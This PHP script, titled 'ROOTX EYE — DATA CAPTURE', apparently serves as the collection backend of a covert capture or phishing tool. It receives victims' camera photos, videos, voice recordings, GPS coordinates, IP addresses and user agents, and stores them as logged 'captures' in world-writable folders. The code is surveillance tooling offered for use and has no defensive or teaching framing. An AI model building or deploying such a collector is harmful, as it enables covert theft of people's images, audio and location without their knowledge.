<?php
// ============================================
// ROOTX EYE — DATA CAPTURE (Admin Panel)
// ============================================

$data_dir = 'data/';
$captures_file = $data_dir . 'captures.json';

// Create directory if not exists
if (!is_dir($data_dir)) {
    mkdir($data_dir, 0777, true);
    // Create subdirectories for different media types
    mkdir($data_dir . 'photos', 0777, true);
    mkdir($data_dir . 'videos', 0777, true);
    mkdir($data_dir . 'audio', 0777, true);
}

// Load existing captures
$captures = [];
if (file_exists($captures_file)) {
    $captures = json_decode(file_get_contents($captures_file), true) ?: [];
}

// Get data from POST/GET
$type = $_POST['type'] ?? $_GET['type'] ?? 'unknown';
$ip = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
$time = date('Y-m-d H:i:s');

// Build capture array
$capture = [
    'id' => uniqid(), // ✅ ADDED: Unique ID for each capture
    'type' => $type,
    'ip' => $ip,
    'user_agent' => $user_agent,
    'time' => $time,
    'file' => '',
    'lat' => null,
    'lng' => null
];

// Handle file upload
if (isset($_FILES['file']) && $_FILES['file']['error'] === UPLOAD_ERR_OK) {
    $file = $_FILES['file'];
    
    // Determine extension and subdirectory
    $ext = 'jpg';
    $subdir = 'photos';
    if ($type == 'video') {
        $ext = 'mp4';
        $subdir = 'videos';
    } elseif ($type == 'voice') {
        $ext = 'mp3';
        $subdir = 'audio';
    }
    
    $filename = $type . '_' . time() . '_' . rand(100, 999) . '.' . $ext;
    $filepath = $data_dir . $subdir . '/' . $filename;
    
    // Move uploaded file
    if (move_uploaded_file($file['tmp_name'], $filepath)) {
        $capture['file'] = $filepath;
    } else {
        // Log error if file move fails
        error_log("Failed to move uploaded file for type: $type");
    }
}

// Handle location data
if (isset($_POST['lat']) && isset($_POST['lng'])) {
    $capture['lat'] = floatval($_POST['lat']);
    $capture['lng'] = floatval($_POST['lng']);
}

// Handle base64 file data (alternative upload method)
if (isset($_POST['file_data']) && !empty($_POST['file_data']) && empty($capture['file'])) {
    $file_data = base64_decode($_POST['file_data']);
    if ($file_data !== false) {
        $ext = 'jpg';
        $subdir = 'photos';
        if ($type == 'video') {
            $ext = 'mp4';
            $subdir = 'videos';
        } elseif ($type == 'voice') {
            $ext = 'mp3';
            $subdir = 'audio';
        }
        $filename = $type . '_' . time() . '_' . rand(100, 999) . '.' . $ext;
        $filepath = $data_dir . $subdir . '/' . $filename;
        if (file_put_contents($filepath, $file_data) !== false) {
            $capture['file'] = $filepath;
        }
    }
}

// Add to captures array and save
$captures[] = $capture;
file_put_contents($captures_file, json_encode($captures, JSON_PRETTY_PRINT));

// Return success response
header('Content-Type: application/json');
echo json_encode(['status' => 'success', 'id' => $capture['id']]);
?>
